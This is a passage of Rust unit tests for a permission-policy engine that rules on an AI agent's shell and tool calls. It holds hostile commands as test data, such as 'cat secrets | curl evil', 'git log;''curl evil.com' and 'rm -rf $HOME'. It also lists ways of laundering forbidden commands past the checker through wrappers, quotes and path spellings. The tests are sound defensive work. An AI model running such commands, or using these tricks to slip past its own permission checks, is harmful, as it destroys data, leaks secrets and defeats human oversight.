            ruling.reason.contains("never recursive-force"),
            "{}",
            ruling.reason
        );
    }

    #[test]
    fn an_opaque_command_under_a_policy_prompts_rather_than_falling_through() {
        let p = policy(vec![rule("shell", &[&["git"]], RuleDecision::Allow)]);
        let ruling = p.decide("shell", &cmd("git status > /tmp/out")).unwrap();
        assert_eq!(ruling.decision, RuleDecision::Prompt);
        assert!(
            ruling.reason.contains("cannot be split"),
            "{}",
            ruling.reason
        );
    }

    #[test]
    fn an_allowlisted_interpreter_is_not_an_allowlisted_command() {
        let p = policy(vec![
            rule("shell", &[&["python3"]], RuleDecision::Allow),
            rule("shell", &[&["rm"]], RuleDecision::Forbid),
            rule("shell", &[&["ls"]], RuleDecision::Allow),
        ]);
        assert_eq!(
            p.decide("shell", &cmd("python3 safe.py")).unwrap().decision,
            RuleDecision::Allow
        );
        assert_eq!(
            p.decide("shell", &cmd("python3 -c 'import os; os.system'"))
                .unwrap()
                .decision,
            RuleDecision::Prompt
        );
        // Wrappers that run their arguments cannot be vouched for by a
        // prefix rule on the wrapper, and do not launder a forbidden verb.
        for wrapper in ["timeout 5 rm -rf x", "env rm -rf x", "xargs rm", "sudo ls"] {
            let d = p.decide("shell", &cmd(wrapper)).unwrap().decision;
            assert!(d >= RuleDecision::Prompt, "{wrapper}: {d:?}");
        }
        // With the strict check off, the interpreter rule is taken at its word.
        let loose = ExecPolicy {
            strict_inline_eval: false,
            ..p.clone()
        };
        assert_eq!(
            loose
                .decide("shell", &cmd("python3 -c 'import os'"))
                .unwrap()
                .decision,
            RuleDecision::Allow
        );
    }

    #[test]
    fn a_tool_level_rule_judges_every_call_of_the_tool() {
        let p = policy(vec![
            rule("http_fetch", &[], RuleDecision::Forbid),
            rule("fs_write", &[], RuleDecision::Prompt),
        ]);
        assert_eq!(
            p.decide("http_fetch", &json!({"url": "https://x"}))
                .unwrap()
                .decision,
            RuleDecision::Forbid
        );
        assert_eq!(
            p.decide("fs_write", &json!({"path": "a"}))
                .unwrap()
                .decision,
            RuleDecision::Prompt
        );
        // And on a command tool, an empty pattern matches every segment.
        let p = policy(vec![rule("shell", &[], RuleDecision::Prompt)]);
        assert_eq!(
            p.decide("shell", &cmd("ls && pwd")).unwrap().decision,
            RuleDecision::Prompt
        );
    }

    /// The PR review's major: a whole-token "quoted" flag let a token that was
    /// quoted in one part hide a bare `;` in another, so `git log;''curl
    /// evil.com` was one segment that an `allow` rule on `git` passed.
    #[test]
    fn a_quote_in_a_token_cannot_hide_an_operator_beside_it() {
        for hidden in [
            "git log --oneline;''curl evil.com",
            "git log ;'' curl evil.com",
            "git status''|curl evil.com",
            "ls ''&& rm -rf x",
            "echo 'a'&",
        ] {
            assert!(
                split_segments(hidden).is_none(),
                "{hidden:?} should be opaque"
            );
        }
        // A fully quoted operator is a plain word, as before.
        assert_eq!(split_segments("echo ';'").unwrap(), vec![vec!["echo", ";"]]);
        assert_eq!(
            split_segments("echo 'a|b' && ls").unwrap(),
            vec![vec!["echo", "a|b"], vec!["ls"]]
        );

        let p = policy(vec![rule(
            "shell",
            &[&["git"], &["status", "diff", "log"]],
            RuleDecision::Allow,
        )]);
        assert_eq!(
            p.decide("shell", &cmd("git log --oneline;''curl evil.com"))
                .unwrap()
                .decision,
            RuleDecision::Prompt,
            "opaque under a policy asks; it never allows"
        );
    }

    /// A wrapper is judged by what it wraps: `forbid` on `rm -rf` is not
    /// laundered down to a prompt (which a headless `Allow` mode answers yes
    /// to) by putting `timeout`, `env` or `sh -c` in front of it.
    #[test]
    fn a_wrapper_is_judged_by_the_command_it_wraps() {
        let p = policy(vec![
            rule("shell", &[&["rm"], &["-rf"]], RuleDecision::Forbid),
            rule("shell", &[&["ls"]], RuleDecision::Allow),
        ]);
        for laundered in [
            "timeout 5 rm -rf x",
            "env rm -rf x",
            "env FOO=bar rm -rf x",
            "nohup rm -rf x",
            "sudo rm -rf x",
            "sh -c 'rm -rf x'",
            "bash -ec 'cd /tmp ; rm -rf x'",
            "xargs rm -rf",
        ] {
            assert_eq!(
                p.decide("shell", &cmd(laundered)).unwrap().decision,
                RuleDecision::Forbid,
                "{laundered}"
            );
        }
        // A wrapper around something merely allowed is still a prompt: the
        // wrapper's own semantics are not vouched for by a rule on the inner
        // command.
        assert_eq!(
            p.decide("shell", &cmd("sudo ls")).unwrap().decision,
            RuleDecision::Prompt
        );
        // An inner string the splitter finds opaque (a `;` glued to a word)
        // cannot be judged segment by segment, but its words can be searched
        // the way an opaque outer command's are — so the `forbid` on `rm` is
        // found here too, where two passes ago this was the stated residue.
        assert_eq!(
            p.decide("shell", &cmd("bash -ec 'cd /tmp; rm -rf x'"))
                .unwrap()
                .decision,
            RuleDecision::Forbid
        );
        // And an opaque inner string with nothing forbidden in it still asks.
        assert_eq!(
            p.decide("shell", &cmd("bash -ec 'cd /tmp; ls'"))
                .unwrap()
                .decision,
            RuleDecision::Prompt
        );
    }

    /// Glued and `=`-joined flag spellings reach the inline-eval check.
    #[test]
    fn glued_inline_eval_flags_are_seen() {
        let p = policy(vec![
            rule("shell", &[&["perl"]], RuleDecision::Allow),
            rule("shell", &[&["python3"]], RuleDecision::Allow),
            rule("shell", &[&["node"]], RuleDecision::Allow),
            rule("shell", &[&["sh"]], RuleDecision::Allow),
            rule("shell", &[&["sed"]], RuleDecision::Allow),
        ]);
        for evals in [
            "perl -e'unlink x'",
            "perl -we 'print 1'",
            "python3 -cimport os",
            "python3 -Bc code",
            "node --eval=1",
            "sh -ec 'ls'",
            "sed --expression=s/a/b/ f",
        ] {
            let d = p.decide("shell", &cmd(evals)).unwrap().decision;
            assert!(d >= RuleDecision::Prompt, "{evals}: {d:?}");
        }
        // And a plain script argument is still the rule's to allow.
        assert_eq!(
            p.decide("shell", &cmd("python3 safe.py --check"))
                .unwrap()
                .decision,
            RuleDecision::Allow
        );
    }

    /// A patterned rule on a tool that sends no `command` is refused at load
    /// for the builtins this crate knows, and asks at call time for a tool it
    /// does not — never silently inert.
    /// A `forbid` reduces any program path to its name — `./rm`, `bin/rm`,
    /// `/tmp/x/rm` are all `rm` — where an `allow` reduces only a system
    /// path. Each guard errs in its own safe direction: a false forbid is a
    /// refusal, a false allow is the feature's whole point lost.
    #[test]
    fn a_forbid_reduces_any_path_and_an_allow_only_a_system_one() {
        let p = policy(vec![
            rule("shell", &[&["rm"], &["-rf"]], RuleDecision::Forbid),
            rule("shell", &[&["git"]], RuleDecision::Allow),
            rule("shell", &[&["/home/me/tools/git"]], RuleDecision::Allow),
        ]);
        for spelled in [
            "./rm -rf y",
            "bin/rm -rf y",
            "/tmp/x/rm -rf y",
            "/bin/rm -rf y",
        ] {
            assert_eq!(
                p.decide("shell", &cmd(spelled)).unwrap().decision,
                RuleDecision::Forbid,
                "{spelled}"
            );
        }
        assert_eq!(
            p.decide("shell", &cmd("/usr/bin/git status"))
                .unwrap()
                .decision,
            RuleDecision::Allow
        );
        // A rule that spells the path matches it literally, wherever it is.
        assert_eq!(
            p.decide("shell", &cmd("/home/me/tools/git status"))
                .unwrap()
                .decision,
            RuleDecision::Allow
        );
        assert_eq!(p.decide("shell", &cmd("/home/me/other/git status")), None);
    }

    /// Quote characters do not hide a forbidden word from the opaque-command
    /// check: `"rm" -rf $HOME` is `rm -rf $HOME`.
    #[test]
    fn quotes_do_not_hide_forbidden_words_in_an_opaque_command() {
        let p = policy(vec![rule(
            "shell",
            &[&["rm"], &["-rf"]],
            RuleDecision::Forbid,
        )]);
        for quoted in [
            "\"rm\" -rf $HOME",
            "'rm' -rf *",
            "r\"m\" '-rf' $HOME",
            "sh -c 'rm -rf /*'",
            "\"/bin/rm\" -rf $HOME",
        ] {
            assert_eq!(
                p.decide("shell", &cmd(quoted)).unwrap().decision,
                RuleDecision::Forbid,
                "{quoted}"
            );
        }
    }

    /// A *patterned* `forbid` is found in an opaque command too, by its words
    /// — `rm -rf $HOME`, `rm -rf *`, a glob or brace spelling — rather than
    /// downgraded to the prompt a headless `Allow` mode answers yes to. The
    /// pattern-less case was fixed a pass earlier and this one, the PR's own
    /// headline example, was not.
    #[test]
    fn an_opaque_command_cannot_dodge_a_patterned_forbid() {
        let p = policy(vec![
            rule("shell", &[&["rm"], &["-rf"]], RuleDecision::Forbid),
            rule("shell", &[&["git"]], RuleDecision::Allow),
        ]);
        for opaque in [
            "rm -rf $HOME",
            "rm -rf *",
            "rm -rf {a,b}",
            "git status; rm -rf $HOME",
            "cd /tmp && rm -rf $(pwd)",
            "/bin/rm -rf ~/*",
        ] {
            assert_eq!(
                p.decide("shell", &cmd(opaque)).unwrap().decision,
                RuleDecision::Forbid,
                "{opaque}"
            );
        }
        // An opaque command with none of the forbidden words still prompts.
        assert_eq!(
            p.decide("shell", &cmd("git status > out"))
                .unwrap()
                .decision,
            RuleDecision::Prompt
        );
    }

    /// Turning the inline-eval strictness off does not switch off the wrapper
    /// lookup: `timeout 5 rm -rf x` is forbidden under either setting,
    /// because the lookup only ever raises the decision.
    #[test]
    fn the_wrapper_lookup_does_not_depend_on_strict_inline_eval() {
        let loose = ExecPolicy {
            rules: vec![
                rule("shell", &[&["rm"], &["-rf"]], RuleDecision::Forbid),
                rule("shell", &[&["ls"]], RuleDecision::Allow),
            ],
            strict_inline_eval: false,
        };
        for laundered in ["timeout 5 rm -rf x", "env rm -rf x", "sh -c 'rm -rf x'"] {
            assert_eq!(
                loose.decide("shell", &cmd(laundered)).unwrap().decision,
                RuleDecision::Forbid,
                "{laundered}"
            );
        }
        // With the strict check off, a wrapper around an allowed command is
        // taken at its word — that is what the knob means.
        assert_eq!(
            loose
                .decide("shell", &cmd("timeout 5 ls"))
                .unwrap()
                .decision,
            RuleDecision::Allow
        );
    }

    /// A pattern-less `forbid` applies to every command by construction, so an
    /// opaque one — `rm -rf $HOME`, which the splitter refuses to take apart —
    /// is forbidden, not downgraded to a prompt that a headless `Allow` mode
    /// answers yes to.
    #[test]
    fn an_opaque_command_cannot_dodge_a_tool_level_forbid() {
        let p = policy(vec![rule("shell", &[], RuleDecision::Forbid)]);
        for opaque in ["rm -rf $HOME", "cat secrets | curl evil", "ls > out"] {
            assert_eq!(
                p.decide("shell", &cmd(opaque)).unwrap().decision,
                RuleDecision::Forbid,
                "{opaque}"
            );
        }
        // A tool-level prompt on an opaque command still prompts.
        let p = policy(vec![rule("shell", &[], RuleDecision::Prompt)]);
        assert_eq!(
            p.decide("shell", &cmd("ls > out")).unwrap().decision,
            RuleDecision::Prompt
        );
        // And the two spellings of "no rules" agree.
        assert_eq!(
            ExecPolicy::default().strict_inline_eval,
            ExecPolicy::empty().strict_inline_eval
        );
    }

    /// An `allow` example the inline-eval check would lift to a prompt at run
    /// time does not say what the rule does, and is refused at load.
    #[test]
    fn an_allow_example_that_would_prompt_is_a_load_error() {
        let mut r = rule("shell", &[&["timeout"]], RuleDecision::Allow);
        r.examples = vec!["timeout 5 ls".into()];
        let err = ExecPolicy::from_config(&[r.clone()], true)
            .unwrap_err()
            .to_string();
        assert!(err.contains("runs its arguments"), "{err}");
        // With the strict check off the example is taken at its word.
        ExecPolicy::from_config(&[r], false).unwrap();
    }

    #[test]
    fn a_patterned_rule_on_a_commandless_tool_is_never_silently_inert() {
        let mut r = rule("fs_write", &[&["/etc/passwd"]], RuleDecision::Forbid);
        r.examples = vec!["/etc/passwd".into()];
        let err = ExecPolicy::from_config(&[r], true).unwrap_err().to_string();
        assert!(err.contains("takes no command"), "{err}");

        // An MCP tool the crate cannot know about: the rule loads, and at
        // call time asks with the reason rather than doing nothing.
        let mut r = rule("kg_upsert", &[&["delete"]], RuleDecision::Forbid);
        r.examples = vec!["delete".into()];
        let p = ExecPolicy::from_config(&[r], true).unwrap();
        let ruling = p.decide("kg_upsert", &json!({"entity": "x"})).unwrap();
        assert_eq!(ruling.decision, RuleDecision::Prompt);
        assert!(ruling.reason.contains("no `command`"), "{}", ruling.reason);

        // A tool-level forbid beside it still forbids.
        let p = policy(vec![
            rule("kg_upsert", &[&["delete"]], RuleDecision::Forbid),
            rule("kg_upsert", &[], RuleDecision::Forbid),
        ]);
        assert_eq!(
            p.decide("kg_upsert", &json!({"entity": "x"}))
                .unwrap()
                .decision,
            RuleDecision::Forbid
        );
    }

    /// A patterned `forbid` or `prompt` with no example is refused at load:
    /// `["rm", "-fr"]` is one transposition from the rule its author meant,
    /// and would otherwise load clean and protect nothing. A pattern-less
    /// one applies to every call and needs none.
    #[test]
    fn a_patterned_narrowing_rule_must_prove_it_fires() {
        for decision in [RuleDecision::Forbid, RuleDecision::Prompt] {
            let bare = rule("shell", &[&["rm"], &["-fr"]], decision);
            let err = ExecPolicy::from_config(&[bare], true)
                .unwrap_err()
                .to_string();
            assert!(err.contains("prove it fires"), "{err}");
            // With the example, the typo is caught by the example check.
            let mut r = rule("shell", &[&["rm"], &["-fr"]], decision);
            r.examples = vec!["rm -rf build".into()];
            let err = ExecPolicy::from_config(&[r], true).unwrap_err().to_string();
            assert!(err.contains("does not match"), "{err}");
            // Spelled right, it loads.
            let mut r = rule("shell", &[&["rm"], &["-rf"]], decision);
            r.examples = vec!["rm -rf build".into()];
            ExecPolicy::from_config(&[r], true).unwrap();
            // Pattern-less: applies to every call, no example asked for.
            ExecPolicy::from_config(&[rule("shell", &[], decision)], true).unwrap();
        }
        // An empty alternation matches nothing and is refused whatever the
        // decision.
        let mut r = rule("shell", &[&["git"], &[]], RuleDecision::Forbid);
        r.examples = vec!["git push".into()];
        let err = ExecPolicy::from_config(&[r], true).unwrap_err().to_string();
        assert!(err.contains("matches nothing"), "{err}");
    }

    /// A `prompt` rule reduces a program path the way `forbid` does — any
    /// path, not only a system one — because `prompt` never widens and a
    /// path spelling was walking past it to a standing yes.
    #[test]
    fn a_prompt_rule_reduces_any_path_like_a_forbid() {
        let p = policy(vec![rule(
            "shell",
            &[&["cargo"], &["publish"]],
            RuleDecision::Prompt,
        )]);
        for spelled in [
            "cargo publish",
            "./cargo publish",
            "bin/cargo publish",
            "/usr/local/bin/cargo publish",
            "/home/me/.cargo/bin/cargo publish",
        ] {
            assert_eq!(
                p.decide("shell", &cmd(spelled)).unwrap().decision,
                RuleDecision::Prompt,
                "{spelled}"
            );
        }
    }

    #[test]
    fn examples_are_checked_at_load() {
        // An allow rule with no examples is refused.
        let bare = rule("shell", &[&["git"]], RuleDecision::Allow);
        let err = ExecPolicy::from_config(&[bare], true)
            .unwrap_err()
            .to_string();
        assert!(err.contains("`match` example"), "{err}");

        // A match example the rule does not match is refused.
        let mut r = rule("shell", &[&["git"], &["status"]], RuleDecision::Allow);
        r.examples = vec!["git status".into(), "git push".into()];
        let err = ExecPolicy::from_config(&[r], true).unwrap_err().to_string();
        assert!(err.contains("does not match"), "{err}");

        // A not_match example the rule *does* match is refused: the rule is
        // wider than its author believes.
        let mut r = rule("shell", &[&["git"]], RuleDecision::Allow);
        r.examples = vec!["git status".into()];
        r.not_match = vec!["git push".into()];
        let err = ExecPolicy::from_config(&[r], true).unwrap_err().to_string();
        assert!(err.contains("wider than its author believes"), "{err}");

        // An example the splitter cannot judge is refused too — on either
        // side, since an unsplittable `not_match` reads as checked and is not.
        let mut r = rule("shell", &[&["git"]], RuleDecision::Allow);
        r.examples = vec!["git status > out".into()];
        let err = ExecPolicy::from_config(&[r], true).unwrap_err().to_string();
        assert!(err.contains("cannot be split"), "{err}");
        let mut r = rule("shell", &[&["git"]], RuleDecision::Allow);
        r.examples = vec!["git status".into()];
        r.not_match = vec!["rm -rf /*".into()];
        let err = ExecPolicy::from_config(&[r], true).unwrap_err().to_string();
        assert!(err.contains("proves nothing"), "{err}");

        // And the rules name their tools, once each, for setup's check.
        let p = ExecPolicy::from_config(
            &[
                rule("shell", &[], RuleDecision::Prompt),
                rule("kg_upsert", &[], RuleDecision::Forbid),
                rule("shell", &[], RuleDecision::Forbid),
            ],
            true,
        )
        .unwrap();
        assert_eq!(p.tools(), vec!["kg_upsert", "shell"]);

        // The well-formed one loads.
        let mut r = rule(
            "shell",
            &[&["git"], &["status", "diff"]],
            RuleDecision::Allow,
        );
        r.examples = vec!["git status".into(), "git diff --stat && git status".into()];
        r.not_match = vec!["git push".into(), "git commit".into()];
        ExecPolicy::from_config(&[r], true).unwrap();
    }

    #[test]
    fn rules_deserialize_from_their_toml_spelling() {
        #[derive(Deserialize)]
        struct Wrap {
            #[serde(rename = "rule")]
            rules: Vec<RuleConfig>,
        }
        let w: Wrap = toml::from_str(
            r#"
[[rule]]
tool = "shell"
pattern = ["git", ["status", "diff", "log", "show"]]
decision = "allow"
match = ["git status", "git diff --stat"]
not_match = ["git push", "git commit"]

[[rule]]
tool = "shell"
pattern = ["rm", "-rf"]
decision = "forbid"
match = ["rm -rf build"]
justification = "never recursive-force from a model-supplied path"
"#,
        )
        .unwrap();
        assert_eq!(w.rules.len(), 2);
        assert_eq!(w.rules[0].decision, RuleDecision::Allow);
        assert_eq!(
            w.rules[0].pattern[1],
            PatternElement::OneOf(vec![
                "status".into(),
                "diff".into(),
                "log".into(),
                "show".into()
            ])
        );
        assert_eq!(w.rules[1].decision, RuleDecision::Forbid);
        let p = ExecPolicy::from_config(&w.rules, true).unwrap();
        assert_eq!(
            p.decide("shell", &cmd("git show HEAD")).unwrap().decision,
            RuleDecision::Allow
        );
    }
}
